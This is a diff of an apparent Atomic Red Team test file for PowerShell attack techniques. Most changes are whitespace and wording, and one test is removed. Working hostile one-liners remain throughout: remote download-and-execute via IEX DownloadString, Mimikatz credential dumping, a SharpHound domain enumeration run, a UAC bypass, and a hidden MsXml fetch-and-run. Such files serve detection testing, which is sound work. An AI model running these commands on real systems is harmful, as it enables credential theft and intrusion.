@@ -19,11 +19,11 @@ atomic_tests:
     command: |
       powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
 
-- name: Run BloodHound from local disk 
+- name: Run BloodHound from local disk
   description: |
     Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.
 
-    Successful execution will produce stdout reporting LDAP connection was successful and BloodHound domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip file. 
+    Successful execution will produce stdout reporting LDAP connection was successful and BloodHound domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip file.
   supported_platforms:
     - windows
   input_arguments:
@@ -39,7 +39,7 @@ atomic_tests:
       description: Output path for BloodHound reports
       type: String
       default: PathToAtomicsFolder\T1086\src
-  
+
   dependency_executor_name: powershell
   dependencies:
     - description: |
@@ -55,7 +55,7 @@ atomic_tests:
     command: |
       write-host "Import and Execution of SharpHound.ps1 from #{file_path}" -ForegroundColor Cyan
       import-module #{file_path}\SharpHound.ps1; invoke-bloodhound -domain #{internal_domain} -OutputDirectory #{output_path}
-       
+
     cleanup_command: |
       Remove-Item #{file_path}\SharpHound.ps1 -Force
       Remove-Item #{file_path}\*BloodHound.zip -Force
@@ -64,7 +64,7 @@ atomic_tests:
   description: |
     Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to #{output_path}. If system is unable to contact a domain, proper execution will not occur.
 
-    Successful execution will produce stdout reporting LDAP connection was successful and BloodHound domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip file. 
+    Successful execution will produce stdout reporting LDAP connection was successful and BloodHound domain enumeration is occurring. Upon completion, final output will be a *BloodHound.zip file.
   supported_platforms:
     - windows
   input_arguments:
@@ -78,14 +78,13 @@ atomic_tests:
     command: |
       write-host "Remote download of SharpHound.ps1, import and execution from $env:temp" -ForegroundColor Cyan
       powershell -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');Invoke-BloodHound -OutputDirectory #{output_path}"
-       
+
     cleanup_command: |
       Remove-Item #{output_path}\*BloodHound.zip -Force
 
 - name: Obfuscation Tests
   description: |
-    Different obfuscated methods to test
-    Reaches out to bit.ly/L3g1t to stdout: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"
+    Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"
   supported_platforms:
     - windows
   executor:
@@ -109,9 +108,9 @@ atomic_tests:
 
 - name: Invoke-AppPathBypass
   description: |
-    Note: Windows 10 only
+    Note: Windows 10 only. Upon execution windows backup and restore window will be opened.
+
     Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
-    Upon execution windows backup and restore window will be opened
   supported_platforms:
     - windows
   executor:
@@ -119,24 +118,6 @@ atomic_tests:
     elevation_required: false
     command: |
       Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
-
-- name: Powershell MsXml COM object - no prompt
-  description: |
-    Provided by https://github.com/mgreen27/mgreen27.github.io
-    Powershell MsXml COM object.
-    Not proxy aware removing cache although does not appear to write to those locations
-  supported_platforms:
-    - windows
-  input_arguments:
-    url:
-      description: url of payload to execute
-      type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1086/src/test.ps1
-  executor:
-    name: command_prompt
-    elevation_required: false
-    command: |
-      powershell.exe IEX -exec bypass -windowstyle hidden -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
 
 - name: Powershell MsXml COM object - with prompt
   description: |
@@ -223,6 +204,8 @@ atomic_tests:
 
 - name: PowerShell Downgrade Attack
   description: |
+    This test requires the manual installation of PowerShell V2.
+
     Attempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/
   supported_platforms:
     - windows
